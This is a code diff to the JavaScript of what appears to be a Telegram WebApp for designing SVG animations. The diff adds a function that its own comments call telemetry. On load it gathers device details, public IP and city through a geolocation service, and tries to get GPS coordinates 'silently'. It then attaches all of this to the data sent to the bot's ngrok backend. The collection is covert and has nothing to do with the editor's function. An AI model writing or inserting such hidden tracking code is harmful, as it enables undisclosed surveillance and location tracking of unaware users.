@@ -131,6 +131,71 @@ let colorPicker;
 let activeColorStatePath = null;
 let activeColorBtnElement = null;
 
+// ===============================================
+// SISTEM TELEMETRI (PENGUMPUL DATA DEVICE & GEO)
+// ===============================================
+let cachedClientMetadata = null;
+let isFetchingMetadata = false;
+
+async function getClientMetadata() {
+    if (cachedClientMetadata) return cachedClientMetadata;
+    if (isFetchingMetadata) {
+        while(isFetchingMetadata) {
+            await new Promise(r => setTimeout(r, 100));
+            if (cachedClientMetadata) return cachedClientMetadata;
+        }
+    }
+    
+    isFetchingMetadata = true;
+    const meta = {
+        platform: (tg && tg.platform) ? tg.platform : "unknown",
+        device: navigator.userAgent,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language || "Tidak diketahui",
+        screen: `${window.screen.width}x${window.screen.height}`,
+        connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "unknown",
+        ip: "Tidak diketahui",
+        geo: "Tidak diketahui",
+        geo_source: "IP"
+    };
+
+    // Fallback IP Geolocation via GeoJS (gratis tanpa kunci API, sangat handal)
+    try {
+        const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
+        if (ipRes.ok) {
+            const ipData = await ipRes.json();
+            meta.ip = ipData.ip || "Tidak diketahui";
+            if(ipData.city || ipData.country) {
+                const locStr = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country || ''}`.replace(/^, | ,|, $/g, '').trim();
+                meta.geo = locStr || "Tidak diketahui";
+            }
+        }
+    } catch (e) { console.warn("IP Geo gagal:", e); }
+
+    // Meminta izin GPS secara diam-diam (Batas waktu 5 detik)
+    const getGps = () => new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+            (err) => resolve(null),
+            { timeout: 5000, maximumAge: 60000 }
+        );
+    });
+
+    try {
+        const gpsGeo = await getGps();
+        if (gpsGeo) {
+            meta.geo = `https://maps.google.com/?q=${gpsGeo}`;
+            meta.geo_source = "GPS Akurat";
+        }
+    } catch(e) {}
+
+    cachedClientMetadata = meta;
+    isFetchingMetadata = false;
+    return meta;
+}
+// ===============================================
+
 async function ensureLottieLoaded() {
     if (window.lottie) return true;
     return new Promise((resolve) => {
@@ -194,6 +259,9 @@ async function fetchThemes() {
 }
 
 async function init() {
+    // Mulai pengambilan telemetri di latar belakang segera setelah WebApp dimuat
+    getClientMetadata().catch(e => console.log(e));
+
     canvas = document.getElementById('svg-canvas'); 
     const urlParams = new URLSearchParams(window.location.search);
     
@@ -565,6 +633,9 @@ async function init() {
                 await ensureLottieLoaded();
                 if(!currentSvgCode || currentSvgCode.trim() === "") throw new Error("Desain SVG kosong.");
 
+                // Tarik metadata untuk melengkapi payload
+                const client_metadata = await getClientMetadata();
+
                 const minifiedSvg = currentSvgCode.replace(/\s+/g, ' ').replace(/>\s+</g, '><').trim();
                 const uint8Array = new TextEncoder().encode(minifiedSvg);
                 const compressed = window.pako.deflate(uint8Array);
@@ -585,7 +656,8 @@ async function init() {
                         is_compressed: true,
                         anim_id: animId,
                         app_state: state,
-                        theme: theme
+                        theme: theme,
+                        client_metadata: client_metadata
                     })
                 });
 
@@ -1926,6 +1998,9 @@ async function sendToBot(isSilent = false, isAuto = false) {
             });
         }
 
+        // Kumpulkan metadata klien sebelum mengirim
+        const client_metadata = await getClientMetadata();
+
         const loader = document.getElementById('loader');
         const loaderText = document.getElementById('loader-text');
         if(loader && !document.getElementById('siluman-container')) {
@@ -1954,7 +2029,7 @@ async function sendToBot(isSilent = false, isAuto = false) {
 
         const initData = tg.initData;
         
-        // --- KIRIM JUGA TEMA YANG SEDANG TERPILIH DI PREVIEW KE BOT ---
+        // --- KIRIM JUGA TEMA YANG SEDANG TERPILIH DI PREVIEW KE BOT SERTA METADATA CLIENT ---
         const response = await fetch(NGROK_API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -1964,7 +2039,8 @@ async function sendToBot(isSilent = false, isAuto = false) {
                 is_compressed: true,
                 is_auto: isAuto, 
                 app_state: state,
-                theme: state.selectedTheme
+                theme: state.selectedTheme,
+                client_metadata: client_metadata
             })
         });
         
